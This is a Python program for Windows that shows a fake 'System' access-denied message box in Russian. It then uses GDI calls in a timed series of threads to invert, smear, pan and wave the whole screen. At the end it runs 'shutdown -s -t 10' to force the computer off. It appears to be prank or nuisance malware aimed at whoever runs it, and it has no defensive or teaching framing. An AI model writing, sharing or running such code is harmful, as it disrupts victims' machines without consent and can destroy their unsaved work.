from PyQt5.QtWidgets import QMessageBox
from PyQt5 import QtWidgets
from os import system
import sys
import threading
import win32gui
import ctypes
import time
import win32con
import math
import win32api
import random

class GDI:
    invert_flag = threading.Event()
    void_flag = threading.Event()
    rbhell_flag = threading.Event()
    bwhell_flag = threading.Event()
    panscreen_flag = threading.Event()
    waves_flag = threading.Event()

    @staticmethod
    def invert():
        hdc = win32gui.GetDC(0)
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        while True:
            if GDI.invert_flag.is_set():
                break
            win32gui.InvertRect(hdc, (0, 0, w ,h))
            time.sleep(1)

    @staticmethod
    def void():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = win32gui.GetDC(0)
        dx = dy = 1
        angle = 0
        size = 1
        speed = 50
        while True:
            if GDI.void_flag.is_set():
                break
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SRCAND)
            dx = math.ceil(math.sin(angle) * size * 10)
            dy = math.ceil(math.cos(angle) * size * 10)
            angle += speed / 10
            if angle > math.pi :
                angle = math.pi * -1

    @staticmethod
    def rainbow_hell():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        while True:
            if GDI.rbhell_flag.is_set():
                break
            hdc = win32gui.GetDC(0)
            color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
            brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
            win32gui.SelectObject(hdc, brush)
            win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
    
    @staticmethod
    def bw_hell():
        import win32gui
        import win32con
        import ctypes
        import math

        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = win32gui.GetDC(0)

        while True:
            if GDI.bwhell_flag.is_set():
                break
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY)
    
    @staticmethod
    def panscreen():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = win32gui.GetDC(0)
        dx = dy = 1
        angle = 0
        size = 1
        speed = 5
        while True:
            if GDI.panscreen_flag.is_set():
                break
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
            dx = math.ceil(math.sin(angle) * size * 10)
            dy = math.ceil(math.cos(angle) * size * 10)
            angle += speed / 10
            if angle > math.pi :
                angle = math.pi * -1
    @staticmethod
    def waves():
        desktop = win32gui.GetDesktopWindow()
        hdc = win32gui.GetWindowDC(desktop)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        angle = 0

        while True:
            if GDI.waves_flag.is_set():
                break
            hdc = win32gui.GetWindowDC(desktop)
            for i in range(int(sw + sh)):
                a = int(math.sin(angle) * 20)
                win32gui.BitBlt(hdc, 0, i, sw, 1, hdc, a, i, win32con.SRCCOPY)
                angle += math.pi / 40
            win32gui.ReleaseDC(desktop, hdc)
            time.sleep(0.01)

    @staticmethod
    def show(sleep):
        GDI.invert_flag.clear() 
        GDI.void_flag.clear()
        GDI.rbhell_flag.clear() 
        GDI.bwhell_flag.clear()
        GDI.panscreen_flag.clear() 
        GDI.waves_flag.clear()

        invert_thread = threading.Thread(target=start_gdi_effect, args=(GDI.invert,))
        void_thread = threading.Thread(target=start_gdi_effect, args=(GDI.void,))
        rbhell_thread = threading.Thread(target=start_gdi_effect, args=(GDI.rainbow_hell,))
        bwhell_thread = threading.Thread(target=start_gdi_effect, args=(GDI.bw_hell,))
        panscreen_thread = threading.Thread(target=start_gdi_effect, args=(GDI.panscreen,))
        waves_thread = threading.Thread(target=start_gdi_effect, args=(GDI.waves,))

        invert_thread.start()
        void_thread.start()

        time.sleep(sleep)

        stop_thread(GDI.void_flag)
        rbhell_thread.start()

        time.sleep(sleep)

        stop_thread(GDI.invert_flag)
        stop_thread(GDI.rbhell_flag)
        bwhell_thread.start()

        time.sleep(sleep)

        stop_thread(GDI.bwhell_flag)
        panscreen_thread.start()

        time.sleep(sleep)

        stop_thread(GDI.panscreen_flag)
        waves_thread.start()
        resume_thread(GDI.invert_flag)
        invert_thread = threading.Thread(target=start_gdi_effect, args=(GDI.invert,))
        invert_thread.start()

        time.sleep(sleep)

        stop_thread(GDI.invert_flag)
        stop_thread(GDI.waves_flag)
        system('shutdown -s -t 10')
        resume_thread(GDI.void_flag)
        void_thread = threading.Thread(target=start_gdi_effect, args=(GDI.void,))
        void_thread.start()




def stop_thread(effect_func):
    effect_func.set()

def resume_thread(effect_func):
    effect_func.clear()

def start_gdi_effect(effect_func):
    effect_func()

app = QtWidgets.QApplication([])

msg = QMessageBox()
msg.setIcon(QMessageBox.Critical)
msg.setText("Отказано в доступе.")
msg.setWindowTitle("System")

msg.exec_()

GDI.show(sleep=10)